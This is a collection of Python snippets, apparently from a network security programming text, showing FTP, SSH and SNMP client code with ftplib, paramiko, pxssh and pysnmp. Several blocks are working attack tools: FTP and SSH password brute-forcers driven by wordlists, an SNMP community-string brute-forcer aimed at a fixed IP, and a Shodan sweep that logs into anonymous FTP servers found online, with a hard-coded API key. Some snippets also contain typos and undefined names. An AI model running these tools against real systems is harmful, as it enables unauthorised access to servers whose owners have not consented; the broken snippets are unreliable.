["```py\nfrom ftplib import FTP\nserver=''\n# Connect with the connect() and login() methods\nftp = FTP()\nftp.connect(server, 21)\nftp.login(\u2018user\u2019, \u2018password\u2019)\n# Connect in the instance to FTP\nftp_client = FTP(server, 'user', 'password')\n```", "```py\n#!/usr/bin/env python\nimport ftplib\nFTP_SERVER_URL = 'ftp.be.debian.org'\nDOWNLOAD_DIR_PATH = '/pub/linux/network/wireless/'\nDOWNLOAD_FILE_NAME = 'iwd-0.3.tar.gz'\n\ndef ftp_file_download(path, username):\n    # open ftp connection\n    ftp_client = ftplib.FTP(path, username)\n    # list the files in the download directory\n    ftp_client.cwd(DOWNLOAD_DIR_PATH)\n    print(\"File list at %s:\" %path)\n    files = ftp_client.dir()\n    print(files)\n    # download a file\n    file_handler = open(DOWNLOAD_FILE_NAME, 'wb')\n    ftp_cmd = 'RETR %s' %DOWNLOAD_FILE_NAME\n    ftp_client.retrbinary(ftp_cmd,file_handler.write)\n    file_handler.close()\n    qftp_client.quit()\n\nif __name__ == '__main__':\n    ftp_file_download(path=FTP_SERVER_URL,username='anonymous')\n```", "```py\nimport ftplib\nimport sys\n\ndef brute_force(ip,users_file,passwords_file):\n    try:\n        ud=open(users_file,\"r\")\n        pd=open(passwords_file,\"r\")\n\n        users= ud.readlines()\n        passwords= pd.readlines()\n\n        for user in users:\n            for password in passwords:\n                try:\n                    print(\"[*] Trying to connect\")\n                    connect=ftplib.FTP(ip)\n                    response=connect.login(user.strip(),password.strip())\n                    print(response)\n                    if \"230 Login\" in response:\n                        print(\"[*]Sucessful attack\")\n                        print(\"User: \"+ user + \"Password: \"+password)\n                        sys.exit()\n                    else:\n                        pass\n                except ftplib.error_perm:\n                    print(\"Cant Brute Force with user \"+user+ \"and password \"+password)\n                connect.close\n\n    except(KeyboardInterrupt):\n         print(\"Interrupted!\")\n         sys.exit()\n\nip=input(\"Enter FTP SERVER:\")\nuser_file=\"users.txt\"\npasswords_file=\"passwords.txt\"\nbrute_force(ip,user_file,passwords_file)\n```", "```py\nimport ftplib\n\ndef anonymousLogin(hostname):\n    try:\n        ftp = ftplib.FTP(hostname)\n        ftp.login('anonymous', '')\n        print(ftp.getwelcome())\n        ftp.set_pasv(1)\n        print(ftp.dir())        \n        print('\\n[*] ' + str(hostname) +' FTP Anonymous Logon Succeeded.')\n        return ftp\n    except Exception as e:\n        print(str(e))\n        print('\\n[-] ' + str(hostname) +' FTP Anonymous Logon Failed.')\n        return False\n```", "```py\nimport ftplib\nimport shodan\nimport socket\nips =[]\n\nshodanKeyString = 'v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik'\nshodanApi = shodan.Shodan(shodanKeyString)\nresults = shodanApi.search(\"port: 21 Anonymous user logged in\")\n\nfor match in results['matches']:\n if match['ip_str'] is not None:\n     ips.append(match['ip_str'])\n\nprint(\"Sites found: %s\" %len(ips))\n\nfor ip in ips:\n    try:\n        print(ip)\n        #server_name = socket.gethostbyaddr(str(ip))\n        server_name = socket.getfqdn(str(ip))\n        print(\"Connecting to ip: \" +ip+ \" / Server name:\" + server_name[0])\n        ftp = ftplib.FTP(ip)\n        ftp.login()\n        print(\"Connection to server_name %s\" %server_name[0])\n        print(ftp.retrlines('LIST'))\n        ftp.quit()\n        print(\"Existing to server_name %s\" %server_name[0])\n    except Exception as e:\n        print(str(e))\n        print(\"Error in listing %s\" %server_name[0])\n```", "```py\nimport paramiko\nssh_client = paramiko.SSHClient()\nssh_client.connect(\u2018host\u2019,username='username', password='password')\n```", "```py\nssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n```", "```py\nssh_client.load_system_host_keys()\n```", "```py\ntransport = paramiko.Transport(ip)\ntry:\n    transport.start_client()\nexcept Exception as e:\n    print(str(e))\ntry:\n    transport.auth_password(username=user,password=passwd)\nexcept Exception as e:\n    print(str(e))\n\nif transport.is_authenticated():\n    print(\"Password found \" + passwd)\n```", "```py\nssh_client.connect(hostname, port, username, password)\nstdin, stdout, stderr = ssh_client.exec_command(cmd)\nfor line in stdout.readlines():\n    print(line.strip())\nssh.close()\n```", "```py\n#!/usr/bin/env python3\nimport getpass\nimport paramiko\n\nHOSTNAME = 'localhost'\nPORT = 22\n\ndef run_ssh_command(username, password, command, hostname=HOSTNAME, port=PORT):\n    ssh_client = paramiko.SSHClient()\n    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    ssh_client.load_system_host_keys()\n    ssh_client.connect(hostname, port, username, password)\n    ssh_session = client.get_transport().open_session()\n    if ssh_session.active:\n        stdin, stdout, stderr = ssh_client.exec_command(command)\n        print(stdout.read())\n    return\n\nif __name__ == '__main__':\n    username = input(\"Enter username: \")\n    password = getpass.getpass(prompt=\"Enter password: \")\n    command= 'ifconfig'\n    run_ssh_command(username, password, command)\n```", "```py\nimport paramiko\n\ndef ssh_command(ip, user, passwd, command):\n    transport = paramiko.Transport(ip)\n    try:\n        transport.start_client()\n    except Exception as e:\n        print(e)\n\n    try:\n        transport.auth_password(username=user,password=passwd)\n    except Exception as e:\n        print(e)\n\n    if transport.is_authenticated():\n        print(transport.getpeername())\n        channel = transport.opem_session()\n        channel.exec_command(command)\n        response = channel.recv(1024)\n        print('Command %r(%r)-->%s' % (command,user,response))\n\nif __name__ == '__main__':\n    username = input(\"Enter username: \")\n    password = getpass.getpass(prompt=\"Enter password: \")\n    command= 'ifconfig'\n    run_ssh_command('localhost',username, password, command)\n```", "```py\nimport paramiko\n\nclass SSHConnection:\n\n    def __init__(self):\n        #ssh connection with paramiko library\n        self.ssh = paramiko.SSHClient()\n\n    def ssh_connect(self,ip,user,password,code=0): self.ssh.load_system_host_keys()\n        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n        print(\"[*] Testing user and password from dictionary\")\n        print(\"[*] User: %s\" %(user))\n        print(\"[*] Pass :%s\" %(password))\n        try:\n            self.ssh.connect(ip,port=22,username=user,password=password,timeout=5)\n        except paramiko.AuthenticationException:\n            code = 1\n        except socket.error as e:\n            code = 2\n            self.ssh.close()\n        return code\n```", "```py\n def startSSHBruteForce(self,host): try:\n            #open files dictionary\n            users_file = open(\"users.txt\")\n            passwords_file = open(\"passwords.txt\")\n            for user in users_file.readlines():\n                for password in passwords_file.readlines():\n                    user_text = user.strip(\"\\n\")\n                    password_text = password.strip(\"\\n\")\n                    try:\n                    #check connection with user and password\n                        response = self.ssh_connect(host,user_text,password_text)\n                        if response == 0:\n                            print(\"[*] User: %s [*] Pass Found:%s\" %(user_text,password_text))\n                            stdin,stdout,stderr = self.ssh.exec_command(\"ifconfig\")\n                            for line in stdout.readlines():\n                                print(line.strip())\n                            sys.exit(0)\n                        elif response == 1:\n                            print(\"[*]Login incorrect\")\n                        elif response == 2:\n                            print(\"[*] Connection could not be established to %s\" %(host))\n                            sys.exit(2)\n                except Exception as e:\n                    print(\"Error ssh connection\")\n                    pass\n            #close files\n            users_file.close()\n            passwords_file.close()\n        except Exception as e:\n            print(\"users.txt /passwords.txt Not found\")\n            pass\n```", "```py\n import pxssh\n help(pxssh)\n```", "```py\nimport pxssh\nimport getpass\n\ntry: \n    connection = pxssh.pxssh()\n    hostname = input('hostname: ')\n    username = input('username: ')\n    password = getpass.getpass('password: ')\n    connection.login (hostname, username, password)\n    connection.sendline ('ls -l')\n    connection.prompt()\n    print(connection.before)\n    connection.sendline ('df')\n    connection.prompt()\n    print(connection.before)\n    connection.logout()\nexcept pxssh.ExceptionPxssh as e:\n    print(\"pxssh failed on login.\")\n    print(str(e))\n```", "```py\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\nimport pxssh\n\nhostname = 'localhost'\nuser = 'user'\npassword = 'password'\ncommand = 'df -h'\n\ndef send_command(ssh_session, command):\n    ssh_session.sendline(command)\n    ssh_session.prompt()\n    print(ssh_session.before)\n\ndef connect(hostname, username, password):\n try:\n     s = pxssh.pxssh()\n     if not s.login(hostname, username, password):\n         print(\"SSH session failed on login.\")\n     return s\n except pxssh.ExceptionPxssh as e:\n     print('[-] Error Connecting')\n     print(str(e))\n\ndef main():\n    session = connect(host, user, password)\n    send_command(session, command)\n    session.logout()\n\nif __name__ == '__main__':\n    main()\n```", "```py\nfrom pysnmp.entity.rfc3413.oneliner import cmdgen \ncmdGen = cmdgen.CommandGenerator()\ncisco_contact_info_oid = \"1.3.6.1.4.1.9.2.1.61.0\"\n```", "```py\nerrorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(cmdgen.CommunityData('secret'),\ncmdgen.UdpTransportTarget(('172.16.1.189', 161)),\ncisco_contact_info_oid)\n\nfor name, val in varBinds:\n    print('%s = %s' % (name.prettyPrint(), str(val)))\n```", "```py\nfrom pysnmp.hlapi import *\n\nSNMP_HOST = '182.16.190.78'\nSNMP_PORT = 161\nSNMP_COMMUNITY = 'public'\n\nerrorIndication, errorStatus, errorIndex, varBinds = next(\n getCmd(SnmpEngine(),\n CommunityData(SNMP_COMMUNITY, mpModel=0),\n UdpTransportTarget((SNMP_HOST, SNMP_PORT)),\n ContextData(),\n ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0)))\n)\nif errorIndication:\n    print(errorIndication)\nelif errorStatus:\n    print('%s at %s' % (errorStatus.prettyPrint(),errorIndex and varBinds[int(errorIndex)-1][0] or '?'))\nelse:\n    for varBind in varBinds:\n        print(' = '.join([ x.prettyPrint() for x in varBind ]))\n```", "```py\nfrom snmp_helper import snmp_get_oid,snmp_extract\n\nSNMP_HOST = '182.16.190.78'\nSNMP_PORT = 161\n\nSNMP_COMMUNITY = 'public'\na_device = (SNMP_HOST, SNMP_COMMUNITY , SNMP_PORT)\nsnmp_data = snmp_get_oid(a_device, oid='.1.3.6.1.2.1.1.1.0',display_errors=True)\nprint(snmp_data)\n\nif snmp_data is not None:\n    output = snmp_extract(snmp_data)\n    print(output)\n```", "```py\nfrom pysnmp.entity.rfc3413.oneliner import cmdgen\n\nSNMP_HOST = '182.16.190.78'\nSNMP_PORT = 161\nSNMP_COMMUNITY = 'public'\n\nsnmpCmdGen = cmdgen.CommandGenerator()\nsnmpTransportData = cmdgen.UdpTransportTarget((SNMP_HOST ,SNMP_PORT ))\n\nerror,errorStatus,errorIndex,binds = snmpCmdGen\ngetCmd(cmdgen.CommunityData(SNMP_COMMUNITY),snmpTransportData,\"1.3.6.1.2.1.1.1.0\",\"1.3.6.1.2.1.1.3.0\",\"1.3.6.1.2.1.2.1.0\")\n\nif error:\n    print(\"Error\"+error)\nelse:\n    if errorStatus:\n        print('%s at %s' %(errorStatus.prettyPrint(),errorIndex and  binds[int(errorIndex)-1] or '?'))\n    else:\n        for name,val in binds:\n            print('%s = %s' % (name.prettyPrint(),val.prettyPrint()))\n```", "```py\nfrom pysnmp.entity.rfc3413.oneliner import cmdgen\n\nSNMP_HOST = '182.16.190.78'\nSNMP_PORT = 161\n\ncmdGen = cmdgen.CommandGenerator()\nfd = open(\"wordlist-common-snmp-community-strings.txt\")\nfor community in fd.readlines():\n    snmpCmdGen = cmdgen.CommandGenerator()\n    snmpTransportData = cmdgen.UdpTransportTarget((SNMP_HOST, SNMP_PORT),timeout=1.5,retries=0)\n\n    error, errorStatus, errorIndex, binds = snmpCmdGen.getCmd(cmdgen.CommunityData(community), snmpTransportData, \"1.3.6.1.2.1.1.1.0\", \"1.3.6.1.2.1.1.3.0\", \"1.3.6.1.2.1.2.1.0\")\n    # Check for errors and print out results\n    if error:\n        print(str(error)+\" For community: %s \" %(community))\n    else:\n        print(\"Community Found '%s' ... exiting.\" %(community))\n        break\n```"]